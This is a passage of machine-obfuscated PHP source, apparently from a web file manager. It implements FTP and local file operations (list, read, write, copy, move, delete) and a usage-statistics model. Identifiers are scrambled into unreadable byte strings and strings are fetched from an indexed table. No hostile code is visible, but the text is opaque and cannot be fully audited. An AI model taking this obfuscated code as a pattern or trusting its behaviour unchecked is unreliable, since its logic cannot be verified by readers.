has($‘¹Éğ‚, $ø§²œèî = false, $‹â›ÙÕ¸ = true) { $Ÿùáö‡Ã =& $_SERVER[ä¿÷‹µ±]; $¤µ‰¿Ò = $×Î•çŒ‡ = array(); $†´ª ¾½ = $ø§²œèî ? !0 : !1; $this->fileList($‘¹Éğ‚, $¤µ‰¿Ò, $×Î•çŒ‡, $†´ª ¾½); if ($ø§²œèî) { return array($Ÿùáö‡Ã[207] => count($×Î•çŒ‡), $Ÿùáö‡Ã[208] => count($¤µ‰¿Ò)); } if ($‹â›ÙÕ¸) { if (count($×Î•çŒ‡)) { return !0; } } else { if (count($¤µ‰¿Ò)) { return !0; } } return !1; } public function listAll($„ÂÙ®Óô) { $ô¢ËÂª =& $_SERVER[ä¿÷‹µ±]; if (!$this->_isconn()) { return !1; } $àÄ¢áİ½ = $Ôñ–•áÊ = array(); $this->fileList($„ÂÙ®Óô, $àÄ¢áİ½, $Ôñ–•áÊ, !0); $Œ«ü§İ— = array(); foreach ($Ôñ–•áÊ as $š½¯ÎŸÆ) { $Œ«ü§İ—[$š½¯ÎŸÆ[$ô¢ËÂª[32]]] = $š½¯ÎŸÆ[$ô¢ËÂª[76]]; } foreach ($àÄ¢áİ½ as $š½¯ÎŸÆ) { if (is_string($š½¯ÎŸÆ)) { $Œ«ü§İ—[$š½¯ÎŸÆ] = 0; } } return $this->listAllFiles($„ÂÙ®Óô, array_keys($Œ«ü§İ—), $Œ«ü§İ—); } public function getContent($ãË©Äµ²) { if (!$this->_isconn()) { return !1; } $ãË©Äµ² = $this->iconvSystem($ãË©Äµ²); return $this->fileSubstr($ãË©Äµ²); } public function setContent($ŒŒ‚ÀáÓ, $»Ã´Äá´ = '') { if (!$this->_isconn()) { return !1; } $ıªÑÒ‘½ = $this->pathThis($this->iconvSystem($ŒŒ‚ÀáÓ)); $¹§ş‘€ƒ = $this->tempFile($ıªÑÒ‘½); file_put_contents($¹§ş‘€ƒ, $»Ã´Äá´); $Ê†”á¦Ÿ = $this->upload($ŒŒ‚ÀáÓ, $this->iconvApp($¹§ş‘€ƒ)); $this->tempFileRemve($¹§ş‘€ƒ); return $Ê†”á¦Ÿ; } public function fileSubstr($—Í»—¬Â, $åøÇÂô = 0, $™áç­´ú = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($—Í»—¬Â, $åøÇÂô, $™áç­´ú); } private function ftpRequest($°…³ÖÈË, $ñâ€£ï“ = 0, $ÚÚ“ÚÇ² = false) { $°…³ÖÈË = $this->iconvSystem($°…³ÖÈË); $€áışå = $this->scheme . $this->host . $_SERVER[ä¿÷‹µ±][4] . $this->port; $õÜ¸¾Æ = curl_init(); curl_setopt($õÜ¸¾Æ, CURLOPT_URL, $€áışå . $this->pathEncode($°…³ÖÈË)); curl_setopt($õÜ¸¾Æ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ÚÚ“ÚÇ²) { $†äÍÇ¯ó = $ñâ€£ï“ + $ÚÚ“ÚÇ² - 1; curl_setopt($õÜ¸¾Æ, CURLOPT_RANGE, "{$ñâ€£ï“}\x2d{$†äÍÇ¯ó}"); } curl_setopt($õÜ¸¾Æ, CURLOPT_RETURNTRANSFER, 1); $¥Ì¨éºæ = curl_exec($õÜ¸¾Æ); curl_close($õÜ¸¾Æ); return $¥Ì¨éºæ; } public function upload($Ğ™Š…”, $×ŠÄ¥§, $ÀÒÛâç· = false, $Úåæƒú„ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ğ™Š…”))) { return !1; } $Ğ™Š…” = $this->iconvSystem($Ğ™Š…”); $×ŠÄ¥§ = $this->iconvSystem($×ŠÄ¥§); $éõœªÓô = ftp_nb_put($this->connect, $Ğ™Š…”, $×ŠÄ¥§, FTP_BINARY); while ($éõœªÓô == FTP_MOREDATA) { $éõœªÓô = ftp_nb_continue($this->connect); } if ($éõœªÓô != FTP_FINISHED) { return !1; } return $this->getPathOuter($Ğ™Š…”); } public function download($Ş”•äÍ­, $ØÛş»å£ = '') { if (!$this->_isconn()) { return !1; } $À—Â¾´” = $this->pathFather($ØÛş»å£); if (!IO::mkdir($À—Â¾´”)) { return !1; } $Ş”•äÍ­ = $this->iconvSystem($Ş”•äÍ­); $ØÛş»å£ = $this->iconvSystem($ØÛş»å£); $ƒ¡ØĞ¿Å = ftp_nb_get($this->connect, $ØÛş»å£, $Ş”•äÍ­, FTP_BINARY); while ($ƒ¡ØĞ¿Å == FTP_MOREDATA) { $ƒ¡ØĞ¿Å = ftp_nb_continue($this->connect); } if ($ƒ¡ØĞ¿Å != FTP_FINISHED) { return !1; } return $this->iconvApp($ØÛş»å£); } public function exist($ãçŠ¼œ) { return $this->isFile($ãçŠ¼œ) || $this->isFolder($ãçŠ¼œ); } public function isFile($•™ÂÛ„À) { return !$this->isFolder($•™ÂÛ„À) && $this->objectMeta($•™ÂÛ„À); } public function isFolder($ş³—Ş¢) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][165], $ş³—Ş¢); } protected function objectMeta($Çƒ…Ò Ê) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][167], $Çƒ…Ò Ê); } protected function _objectMeta($Ñ™ÊãÜÀ) { $Šîûé˜€ =& $_SERVER[ä¿÷‹µ±]; if ($Ñ™ÊãÜÀ == $Šîûé˜€[12] || $Ñ™ÊãÜÀ == $Šîûé˜€[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ñ™ÊãÜÀ = $this->iconvSystem($Ñ™ÊãÜÀ); $ëÔ­×˜‚ = array($Šîûé˜€[32] => $this->iconvApp($Ñ™ÊãÜÀ), $Šîûé˜€[33] => $Šîûé˜€[199], $Šîûé˜€[76] => 0); @ftp_chdir($this->connect, $Šîûé˜€[8]); $ÉÆ›³»¤ = @ftp_size($this->connect, $Ñ™ÊãÜÀ); if ($ÉÆ›³»¤ != -1) { $ëÔ­×˜‚[$Šîûé˜€[76]] = $ÉÆ›³»¤; } else { $òı³…« = @ftp_chdir($this->connect, $Ñ™ÊãÜÀ); if (!$òı³…«) { return !1; } $ëÔ­×˜‚[$Šîûé˜€[33]] = $Šîûé˜€[75]; } return $ëÔ­×˜‚; } protected function _isFolder($×¶ÇÂç‰) { $ïç‰ÂÆã =& $_SERVER[ä¿÷‹µ±]; if ($×¶ÇÂç‰ == $ïç‰ÂÆã[12] || $×¶ÇÂç‰ == $ïç‰ÂÆã[8]) { return !0; } $ï—‡•ƒÑ = $this->_objectMeta($×¶ÇÂç‰); return isset($ï—‡•ƒÑ[$ïç‰ÂÆã[33]]) && $ï—‡•ƒÑ[$ïç‰ÂÆã[33]] == $ïç‰ÂÆã[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($³–í”é€) { if (substr($³–í”é€, 0, 2) == $_SERVER[ä¿÷‹µ±][1389]) { $³–í”é€ = BASIC_PATH . substr($³–í”é€, 2); } return $³–í”é€; } public function iconvApp($ÆóÖÕÇ) { $Â“§•Ùù =& $_SERVER[ä¿÷‹µ±]; global $config; return $this->iconvTo($ÆóÖÕÇ, $config[$Â“§•Ùù[1387]], $config[$Â“§•Ùù[1386]]); } public function iconvSystem($ñÕŸ£¾) { $îçóú² =& $_SERVER[ä¿÷‹µ±]; global $config; return $this->iconvTo($ñÕŸ£¾, $config[$îçóú²[1386]], $config[$îçóú²[1387]]); } public function getPathOuter($Ë¢üüüı) { $Ò·­¾ô¼ =& $_SERVER[ä¿÷‹µ±]; $ì‹¡Á˜í = $this->iconvApp($this->pathBase); $Ë¢üüüı = $this->iconvApp($Ë¢üüüı); if (substr($ì‹¡Á˜í, 0, 2) == $Ò·­¾ô¼[1389]) { $ì‹¡Á˜í = BASIC_PATH . substr($ì‹¡Á˜í, 2); } if (substr($Ë¢üüüı, 0, 2) == $Ò·­¾ô¼[1389]) { $Ë¢üüüı = BASIC_PATH . substr($Ë¢üüüı, 2); } $ì‹¡Á˜í = KodIO::clear($ì‹¡Á˜í); $Ë¢üüüı = KodIO::clear($Ë¢üüüı); $Ë¢üüüı = substr($Ë¢üüüı, strlen($ì‹¡Á˜í)); if (empty($this->pathDriver)) { return $Ë¢üüüı; } return $this->pathDriver . $Ò·­¾ô¼[8] . ltrim($Ë¢üüüı, $Ò·­¾ô¼[8]); } public function mkfile($Š‰ å»¬, $úÁ²®ÚÆ = '', $¨à²¦œÃ = REPEAT_RENAME) { $Š‰ å»¬ = $this->iconvSystem($Š‰ å»¬); @touch($Š‰ å»¬); if ($úÁ²®ÚÆ) { file_put_contents($Š‰ å»¬, $úÁ²®ÚÆ); } @chmod($Š‰ å»¬, $this->pathAuth); return is_file($Š‰ å»¬) ? $this->getPathOuter($Š‰ å»¬) : !1; } public function mkdir($ŸÊØãº, $úüÓ¡¾È = REPEAT_SKIP) { $ŸÊØãº = $this->iconvSystem($ŸÊØãº); if (is_dir($ŸÊØãº)) { return $this->getPathOuter($ŸÊØãº); } @mkdir($ŸÊØãº, $this->pathAuth, !0); @chmod($ŸÊØãº, $this->pathAuth); return is_dir($ŸÊØãº) ? $this->getPathOuter($ŸÊØãº) : !1; } public function copyFile($ªˆºÈøÈ, $÷á±„Ã) { $this->mkdir($this->pathFather($÷á±„Ã)); $ªˆºÈøÈ = $this->iconvSystem($ªˆºÈøÈ); $÷á±„Ã = $this->iconvSystem($÷á±„Ã); $â®ç‹ãŒ = copy_64($ªˆºÈøÈ, $÷á±„Ã); @chmod($÷á±„Ã, $this->pathAuth); return $â®ç‹ãŒ ? $this->getPathOuter($÷á±„Ã) : !1; } public function moveFile($Ø¹ˆœÆ¯, $É•­šŠš) { $this->mkdir($this->pathFather($É•­šŠš)); $Ø¹ˆœÆ¯ = $this->iconvSystem($Ø¹ˆœÆ¯); $É•­šŠš = $this->iconvSystem($É•­šŠš); $ºÅ¼–·Ì = intval(@rename($Ø¹ˆœÆ¯, $É•­šŠš)); if (!$ºÅ¼–·Ì) { if ($ºÅ¼–·Ì = intval(@copy_64($Ø¹ˆœÆ¯, $É•­šŠš))) { @unlink($Ø¹ˆœÆ¯); } } @chmod($É•­šŠš, $this->pathAuth); return $ºÅ¼–·Ì ? $this->getPathOuter($É•­šŠš) : !1; } public function movePath($şæÉ„÷, $‰ÒîÃ÷‚, $Í•½ÅÆÉ = false) { $Å“’£à¾ =& $_SERVER[ä¿÷‹µ±]; $şæÉ„÷ = $this->iconvSystem($şæÉ„÷); $‰ÒîÃ÷‚ = $this->iconvSystem($‰ÒîÃ÷‚); $´«Ò› Â = rtrim($‰ÒîÃ÷‚, $Å“’£à¾[8]) . $Å“’£à¾[8] . ($Í•½ÅÆÉ ? $Í•½ÅÆÉ : get_path_this($şæÉ„÷)); if (file_exists($´«Ò› Â)) { return !1; } $ÍÊå¹ÒŞ = intval(@rename($şæÉ„÷, $´«Ò› Â)); $ÍÊå¹ÒŞ = file_exists($´«Ò› Â); return $ÍÊå¹ÒŞ ? $this->getPathOuter($´«Ò› Â) : !1; } public function delFile($»‚°‡ş) { $»‚°‡ş = $this->iconvSystem($»‚°‡ş); if (!@unlink($»‚°‡ş)) { @chmod($»‚°‡ş, $this->pathAuth); if (!@unlink($»‚°‡ş)) { return !1; } } else { return !0; } } public function delFolder($”›ŠÙï±) { $àë–È =& $_SERVER[ä¿÷‹µ±]; $”›ŠÙï± = $this->iconvSystem($”›ŠÙï±); if (!is_dir($”›ŠÙï±)) { return !0; } if (!($“ˆ—Ú°ğ = opendir($”›ŠÙï±))) { return !1; } while (($“ĞšŸèú = readdir($“ˆ—Ú°ğ)) !== !1) { if ($“ĞšŸèú == $àë–È[10] || $“ĞšŸèú == $àë–È[1396]) { continue; } $È½œ ª¿ = $”›ŠÙï± . $àë–È[8] . $“ĞšŸèú; if (is_file($È½œ ª¿) || is_link($È½œ ª¿)) { if (!unlink($È½œ ª¿)) { chmod($È½œ ª¿, $this->pathAuth); if (!unlink($È½œ ª¿)) { return !1; } } } else { if (is_dir($È½œ ª¿)) { chmod($È½œ ª¿, $this->pathAuth); $È½œ ª¿ = $this->iconvApp($È½œ ª¿); if (!$this->delFolder($È½œ ª¿)) { return !1; } } } } closedir($“ˆ—Ú°ğ); return rmdir($”›ŠÙï±); } public function rename($Ï¾Ÿ®œŒ, $¤ü±ø‡¼) { $êÓ¶âÖ¯ =& $_SERVER[ä¿÷‹µ±]; $ÃÜä›Í = $this->fileNameAuto($this->pathFather($Ï¾Ÿ®œŒ), $¤ü±ø‡¼); $ÃÜä›Í = $this->iconvSystem($ÃÜä›Í); $Ï¾Ÿ®œŒ = $this->iconvSystem($Ï¾Ÿ®œŒ); $¨µ¤ƒó¬ = $this->pathFather($Ï¾Ÿ®œŒ); $ĞØ„Ş×ø = rtrim($¨µ¤ƒó¬, $êÓ¶âÖ¯[8]) . $êÓ¶âÖ¯[8] . $ÃÜä›Í; $‡·ßÃæ = @rename($Ï¾Ÿ®œŒ, $ĞØ„Ş×ø); $ĞØ„Ş×ø = $this->iconvApp($ĞØ„Ş×ø); return $‡·ßÃæ ? $this->getPathOuter($ĞØ„Ş×ø) : !1; } public function size($óúüÇªÙ) { $óúüÇªÙ = $this->iconvSystem($óúüÇªÙ); return filesize_64($óúüÇªÙ); } public function info($ıæÒµ°ã) { $ıæÒµ°ã = $this->iconvSystem($ıæÒµ°ã); if ($this->isFolder($ıæÒµ°ã)) { return $this->folderInfo($ıæÒµ°ã); } else { if ($this->isFile($ıæÒµ°ã)) { return $this->fileInfo($ıæÒµ°ã); } } return !1; } protected function infoChildren($²°ŒĞ˜ß, &$İäŸŸœÑ, $ØÏš¨Ïµ = true) { $ŞÌ†‰«ö =& $_SERVER[ä¿÷‹µ±]; check_abort_echo(); $²°ŒĞ˜ß = rtrim($²°ŒĞ˜ß, $ŞÌ†‰«ö[8]) . $ŞÌ†‰«ö[8]; if ($ØÏš¨Ïµ) { $²°ŒĞ˜ß = $this->iconvSystem($²°ŒĞ˜ß); } if (!($Œ®Ú©àÆ = @opendir($²°ŒĞ˜ß))) { return; } while (($¾ÃÄèÌ = readdir($Œ®Ú©àÆ)) !== !1) { if ($¾ÃÄèÌ == $ŞÌ†‰«ö[10] || $¾ÃÄèÌ == $ŞÌ†‰«ö[1396]) { continue; } $Ï¹¸ıŒÏ = $²°ŒĞ˜ß . $¾ÃÄèÌ; if (is_file($Ï¹¸ıŒÏ) || is_link($Ï¹¸ıŒÏ)) { $İäŸŸœÑ[$ŞÌ†‰«ö[77]]++; $İäŸŸœÑ[$ŞÌ†‰«ö[76]] += filesize_64($Ï¹¸ıŒÏ); } else { if (is_dir($Ï¹¸ıŒÏ)) { $İäŸŸœÑ[$ŞÌ†‰«ö[78]]++; $this->infoChildren($Ï¹¸ıŒÏ, $İäŸŸœÑ, !1); } } } closedir($Œ®Ú©àÆ); } private function folderInfo($µ†¬Ö, $îÃÄ € = false) { $®Şé©ö =& $_SERVER[ä¿÷‹µ±]; $µ†¬Ö = rtrim($µ†¬Ö, $®Şé©ö[8]) . $®Şé©ö[8]; $Ø¡øÜ¼â = $this->iconvApp($this->pathThis($µ†¬Ö)); if ($îÃÄ €) { return array($®Şé©ö[32] => $Ø¡øÜ¼â, $®Şé©ö[84] => $this->getPathOuter($µ†¬Ö), $®Şé©ö[33] => $®Şé©ö[75]); } $§»Ú…Ò = array($®Şé©ö[32] => $Ø¡øÜ¼â, $®Şé©ö[84] => $this->getPathOuter($µ†¬Ö), $®Şé©ö[33] => $®Şé©ö[75], $®Şé©ö[200] => @filectime($µ†¬Ö), $®Şé©ö[85] => @filemtime($µ†¬Ö), $®Şé©ö[1399] => @fileatime($µ†¬Ö), $®Şé©ö[1400] => is_readable($µ†¬Ö), $®Şé©ö[1401] => is_writable($µ†¬Ö), $®Şé©ö[1402] => get_mode($µ†¬Ö)); return $§»Ú…Ò; } private function fileInfo($½ØĞëŸ©, $ùÅ´—©Ü = false) { $ë‡¤ÄÉÈ =& $_SERVER[ä¿÷‹µ±]; $ú§´×Ûí = $this->iconvApp($this->pathThis($½ØĞëŸ©)); if ($ùÅ´—©Ü) { return array($ë‡¤ÄÉÈ[32] => $ú§´×Ûí, $ë‡¤ÄÉÈ[84] => $this->getPathOuter($½ØĞëŸ©), $ë‡¤ÄÉÈ[33] => $ë‡¤ÄÉÈ[199], $ë‡¤ÄÉÈ[76] => $this->size($½ØĞëŸ©), $ë‡¤ÄÉÈ[174] => $this->ext($ú§´×Ûí)); } $ç…ÑÁÇó = array($ë‡¤ÄÉÈ[32] => $ú§´×Ûí, $ë‡¤ÄÉÈ[84] => $this->getPathOuter($½ØĞëŸ©), $ë‡¤ÄÉÈ[33] => $ë‡¤ÄÉÈ[199], $ë‡¤ÄÉÈ[200] => @filectime($½ØĞëŸ©), $ë‡¤ÄÉÈ[85] => @filemtime($½ØĞëŸ©), $ë‡¤ÄÉÈ[1399] => @fileatime($½ØĞëŸ©), $ë‡¤ÄÉÈ[76] => $this->size($½ØĞëŸ©), $ë‡¤ÄÉÈ[174] => $this->ext($ú§´×Ûí), $ë‡¤ÄÉÈ[1400] => is_readable($½ØĞëŸ©), $ë‡¤ÄÉÈ[1401] => is_writable($½ØĞëŸ©), $ë‡¤ÄÉÈ[1402] => get_mode($½ØĞëŸ©)); return $ç…ÑÁÇó; } public function exist($â£–©ùª) { $â£–©ùª = $this->iconvSystem($â£–©ùª); return @file_exists($â£–©ùª); } public function isFile($—àÚÛşç) { $—àÚÛşç = $this->iconvSystem($—àÚÛşç); return @is_file($—àÚÛşç); } public function isFolder($Åº¢Ó) { $Åº¢Ó = $this->iconvSystem($Åº¢Ó); return @is_dir($Åº¢Ó); } public function listPath($Ã°‚‹Ë, $Ê©ÉÉ» = false) { $ÊÓšçÀû =& $_SERVER[ä¿÷‹µ±]; $Ã°‚‹Ë = $this->iconvSystem($Ã°‚‹Ë); $Ã°‚‹Ë = rtrim($Ã°‚‹Ë, $ÊÓšçÀû[8]) . $ÊÓšçÀû[8]; $¿Óıñ‹ = array($ÊÓšçÀû[82] => array(), $ÊÓšçÀû[83] => array()); if (!($×¨ÓÄòœ = @opendir($Ã°‚‹Ë))) { return $¿Óıñ‹; } while (($ó¯‹’¹¥ = readdir($×¨ÓÄòœ)) !== !1) { if ($ó¯‹’¹¥ == $ÊÓšçÀû[10] || $ó¯‹’¹¥ == $ÊÓšçÀû[1396]) { continue; } $Ä‘‰¬Ì = $Ã°‚‹Ë . $ó¯‹’¹¥; if (is_file($Ä‘‰¬Ì)) { $¿Óıñ‹[$ÊÓšçÀû[83]][] = $this->fileInfo($Ä‘‰¬Ì, $Ê©ÉÉ»); } else { $¿Óıñ‹[$ÊÓšçÀû[82]][] = $this->folderInfo($Ä‘‰¬Ì, $Ê©ÉÉ»); } } closedir($×¨ÓÄòœ); return $¿Óıñ‹; } public function listAll($æ‰ìüİÅ, &$Ü´ô®í³ = array()) { $ÍØ“¾îÓ =& $_SERVER[ä¿÷‹µ±]; $æ‰ìüİÅ = $this->iconvSystem($æ‰ìüİÅ); $æ‰ìüİÅ = rtrim($æ‰ìüİÅ, $ÍØ“¾îÓ[8]) . $ÍØ“¾îÓ[8]; if (!($Ë€¤Ì€û = @opendir($æ‰ìüİÅ))) { return $Ü´ô®í³; } while (($ü²ğôÖ¦ = readdir($Ë€¤Ì€û)) !== !1) { if ($ü²ğôÖ¦ == $ÍØ“¾îÓ[10] || $ü²ğôÖ¦ == $ÍØ“¾îÓ[1396]) { continue; } $êŞ‚®®Á = $æ‰ìüİÅ . $ü²ğôÖ¦; if (is_dir($êŞ‚®®Á) && !is_link($êŞ‚®®Á)) { $Ü´ô®í³[] = array($ÍØ“¾îÓ[84] => $êŞ‚®®Á . $ÍØ“¾îÓ[8], $ÍØ“¾îÓ[75] => 1, $ÍØ“¾îÓ[85] => @filemtime($êŞ‚®®Á), $ÍØ“¾îÓ[76] => 0); $this->listAll($êŞ‚®®Á, $Ü´ô®í³); } else { $Ü´ô®í³[] = array($ÍØ“¾îÓ[84] => $êŞ‚®®Á, $ÍØ“¾îÓ[75] => 0, $ÍØ“¾îÓ[85] => @filemtime($êŞ‚®®Á), $ÍØ“¾îÓ[76] => $this->size($êŞ‚®®Á)); } } closedir($Ë€¤Ì€û); return $Ü´ô®í³; } public function has($ûîôà³µ, $Ğ”£ªÚâ = false, $ªÒƒÙ•€ = true) { $á´İÃ™Ì =& $_SERVER[ä¿÷‹µ±]; $ûîôà³µ = $this->iconvSystem($ûîôà³µ); $ûîôà³µ = rtrim($ûîôà³µ, $á´İÃ™Ì[8]) . $á´İÃ™Ì[8]; if (!($â±ÄĞÑ = @opendir($ûîôà³µ))) { return !1; } $´‹¾Â•ü = 0; $°¾©ß˜Â = 0; $à©Ê˜€¦ = 0; while (($¼Òğæç§ = readdir($â±ÄĞÑ)) !== !1) { if ($¼Òğæç§ == $á´İÃ™Ì[10] || $¼Òğæç§ == $á´İÃ™Ì[1396]) { continue; } $õäŠú²´ = $ûîôà³µ . $¼Òğæç§; if ($Ğ”£ªÚâ) { $à©Ê˜€¦++; if (@is_file($õäŠú²´)) { $´‹¾Â•ü++; } else { $°¾©ß˜Â++; } if ($à©Ê˜€¦ > 10000) { break; } continue; } if ($ªÒƒÙ•€) { if (@is_file($õäŠú²´)) { return !0; } } else { if (@is_dir($õäŠú²´ . $á´İÃ™Ì[8])) { return !0; } } } closedir($â±ÄĞÑ); if ($Ğ”£ªÚâ) { return array($á´İÃ™Ì[207] => $´‹¾Â•ü, $á´İÃ™Ì[208] => $°¾©ß˜Â); } return !1; } public function hashSimple($¡ ±Ğ©ı) { $Å‚Ä®ÚÀ =& $_SERVER[ä¿÷‹µ±]; if (!$¡ ±Ğ©ı) { return md5($Å‚Ä®ÚÀ[12]); } $¡ ±Ğ©ı = $this->iconvSystem($¡ ±Ğ©ı); $¨©Ò› = $this->size($¡ ±Ğ©ı); $…á½ï‘ = 200; $ÇËĞÛå = 50; if ($¨©Ò› <= $…á½ï‘ * $ÇËĞÛå) { return $this->hashMd5($¡ ±Ğ©ı) . $¨©Ò›; } $Ê‡××¯€ = $Å‚Ä®ÚÀ[12]; $™†È¯ô = intval($¨©Ò› / $ÇËĞÛå); $¸“Š£Ä« = fopen($¡ ±Ğ©ı, $Å‚Ä®ÚÀ[1403]); if (!$¸“Š£Ä«) { return $Ê‡××¯€; } for ($˜„ëŞÉè = 0; $˜„ëŞÉè < $ÇËĞÛå; $˜„ëŞÉè++) { fseek_64($¸“Š£Ä«, $™†È¯ô * $˜„ëŞÉè); $Ê‡××¯€ .= fread($¸“Š£Ä«, $…á½ï‘); } fseek_64($¸“Š£Ä«, $¨©Ò› - $…á½ï‘); $Ê‡××¯€ .= fread($¸“Š£Ä«, $…á½ï‘); fclose($¸“Š£Ä«); return md5($Ê‡××¯€) . $¨©Ò›; } public function getContent($Èšãú…×) { $Èšãú…× = $this->iconvSystem($Èšãú…×); return file_get_contents($Èšãú…×); } public function setContent($ÀÁ‘úëÎ, $ÁûÈùÇÒ = '') { $ÀÁ‘úëÎ = $this->iconvSystem($ÀÁ‘úëÎ); $±„¤Œ ú = @file_put_contents($ÀÁ‘úëÎ, $ÁûÈùÇÒ, LOCK_EX); clearstatcache(); @chmod($ÀÁ‘úëÎ, $this->pathAuth); return $±„¤Œ ú === !1 ? !1 : !0; } public function fileSubstr($€È—×è, $”À–ëŞû = 0, $æÔ¯¤Œ© = false) { $âÂó‚ƒÄ =& $_SERVER[ä¿÷‹µ±]; $€È—×è = $this->iconvSystem($€È—×è); if ($æÔ¯¤Œ© === !1) { $æÔ¯¤Œ© = $this->size($€È—×è); } if ($æÔ¯¤Œ© <= 0) { return $âÂó‚ƒÄ[12]; } $ÆıÁ ı„ = fopen($€È—×è, $âÂó‚ƒÄ[1403]); if (!$ÆıÁ ı„) { return !1; } fseek_64($ÆıÁ ı„, $”À–ëŞû); $ÔÍœ ¡ø = fread($ÆıÁ ı„, $æÔ¯¤Œ©); fclose($ÆıÁ ı„); return $ÔÍœ ¡ø; } public function upload($†ÒÍíßĞ, $ãÆ†ˆà, $„‘î¨ë¨ = false, $ôƒÁŞŠŞ = REPEAT_REPLACE) { if ($„‘î¨ë¨) { return $this->moveFile($ãÆ†ˆà, $†ÒÍíßĞ); } return $this->copyFile($ãÆ†ˆà, $†ÒÍíßĞ); } public function setModifyTime($­’¯¤‰æ, $¹÷—İ—ì = '') { @touch($­’¯¤‰æ, intval($¹÷—İ—ì)); } public function download($÷ãâ‘¹Ô, $ˆáÔ’÷¦) { return $this->iconvSystem($÷ãâ‘¹Ô); } } goto BÄ“¹¿®Ö¥; dĞâñÀŞ…á: class AnalysisModel extends ModelBaseLight { public function init($æ¾õ„Ú) { $îÙ¸ôë =& $_SERVER[ä¿÷‹µ±]; $öÙı©æ× = array($îÙ¸ôë[600] => array($îÙ¸ôë[33] => $îÙ¸ôë[1779], $îÙ¸ôë[273] => array($îÙ¸ôë[224], $îÙ¸ôë[784], $îÙ¸ôë[1780], $îÙ¸ôë[1781])), $îÙ¸ôë[1782] => array($îÙ¸ôë[33] => $îÙ¸ôë[1783], $îÙ¸ôë[273] => array($îÙ¸ôë[224], $îÙ¸ôë[782], $îÙ¸ôë[1784], $îÙ¸ôë[1785], $îÙ¸ôë[1786]))); if (!isset($öÙı©æ×[$æ¾õ„Ú])) { return !1; } $this->optionType = $öÙı©æ×[$æ¾õ„Ú][$îÙ¸ôë[33]]; $this->field = $öÙı©æ×[$æ¾õ„Ú][$îÙ¸ôë[273]]; return !0; } public function listData($»€‡ÛÇ‚ = false, $ßÓúà‘ó = "\155\157\x64\151\x66\171\124\151\155\145", $ÀŞùŸà² = false) { return parent::listData($»€‡ÛÇ‚, $ßÓúà‘ó, $ÀŞùŸà²); } public function trendList($ûúÁîõ¸) { $ÀÆ¥¸†Ç =& $_SERVER[ä¿÷‹µ±]; $àØ•š£ = $this->listData(); if ($àØ•š£) { $ÔÎîüó§ = end($àØ•š£); $ ¦°•¦ = date($ÀÆ¥¸†Ç[1787], strtotime($ÀÆ¥¸†Ç[1788])); if ($ÔÎîüó§[$ÀÆ¥¸†Ç[224]] == $ ¦°•¦) { return $àØ•š£; } $„¹Øíúø = strtotime($ÔÎîüó§[$ÀÆ¥¸†Ç[224]]); } if (!isset($„¹Øíúø)) { $·Ö€Ææ“ = $ûúÁîõ¸ == $ÀÆ¥¸†Ç[600] ? $ÀÆ¥¸†Ç[535] : $ÀÆ¥¸†Ç[844]; $„¹Øíúø = Model($·Ö€Ææ“)->min($ÀÆ¥¸†Ç[200]); } $‘³ŠŠšå = $ÀÆ¥¸†Ç[1789] . ucfirst($ûúÁîõ¸); $ÃÉ©Êıü = $this->dateList($„¹Øíúø); foreach ($ÃÉ©Êıü as $ ¦°•¦) { $this->{$‘³ŠŠšå}($ ¦°•¦); } return $this->listData(); } private function dateList($—É÷©¢ƒ) { $ÄĞ‡ÃåÒ =& $_SERVER[ä¿÷‹µ±]; $ÊÒü÷‚® = $—É÷©¢ƒ; $¬ñ´¤Ş³ = strtotime($ÄĞ‡ÃåÒ[1788]); $°«ñ–˜Ÿ = array(); while ($ÊÒü÷‚® <= $¬ñ´¤Ş³) { $°«ñ–˜Ÿ[] = date($ÄĞ‡ÃåÒ[1787], $ÊÒü÷‚®); $ÊÒü÷‚® = strtotime($ÄĞ‡ÃåÒ[1790], $ÊÒü÷‚®); } return $°«ñ–˜Ÿ; } public function _recordUser($êò’’ÜÏ = '') { $›Ìùƒ¢å =& $_SERVER[ä¿÷‹µ±]; $×€‹ÈÌõ = strtotime(date($›Ìùƒ¢å[1791], strtotime($êò’’ÜÏ))); $”ÕÕİ† = strtotime(date($›Ìùƒ¢å[1792], strtotime($êò’’ÜÏ))); $ğŞ»ö— = array($›Ìùƒ¢å[200] => array($›Ìùƒ¢å[1035], $”ÕÕİ†)); $ŠÅà–”É = Model($›Ìùƒ¢å[535])->where($ğŞ»ö—)->count($›Ìùƒ¢å[1678]); $ğŞ»ö—[$›Ìùƒ¢å[200]] = array($›Ìùƒ¢å[333], array($×€‹ÈÌõ, $”ÕÕİ†)); $¿ç¨±Ù = Model($›Ìùƒ¢å[535])->where($ğŞ»ö—)->count($›Ìùƒ¢å[1678]); $ğŞ»ö—[$›Ìùƒ¢å[33]] = $›Ìùƒ¢å[1793]; $ï¶µ±ü = Model($›Ìùƒ¢å[1794])->where($ğŞ»ö—)->count($›Ìùƒ¢å[1795]); $ùâò¯Íà = array($›Ìùƒ¢å[224] => $êò’’ÜÏ, $›Ìùƒ¢å[784] => (int) $ŠÅà–”É, $›Ìùƒ¢å[1780] => (int) $¿ç¨±Ù, $›Ìùƒ¢å[1781] => (int) $ï¶µ±ü); return $this->insert($ùâò¯Íà); } public function _recordStore($ëõó’ğ = '') { $ÇäªªëË =& $_SERVER[ä¿÷‹µ±]; $¦€üÕ™“ = strtotime(date($ÇäªªëË[1792], strtotime($ëõó’ğ))); $£ãµÀ› = array($ÇäªªëË[200] => array($ÇäªªëË[1035], $¦€üÕ™“)); $ĞØ¶ÎŸ’ = Model($ÇäªªëË[471])->where($£ãµÀ›)->sum($ÇäªªëË[76]); $£ãµÀ›[$ÇäªªëË[410]] = 0; $ùœúÀ†Ï = Model($ÇäªªëË[844])->where($£ãµÀ›)->sum($ÇäªªëË[76]); $£ãµÀ›[$ÇäªªëË[411]] = 1; $Ç†§ßŠ¡ = Model($ÇäªªëË[844])->where($£ãµÀ›)->sum($ÇäªªëË[76]); $£ãµÀ›[$ÇäªªëË[411]] = 2; $üÑõÄî£ = Model($ÇäªªëË[844])->where($£ãµÀ›)->sum($ÇäªªëË[76]); $æÂí©¡ú = array($ÇäªªëË[224] => $ëõó’ğ, 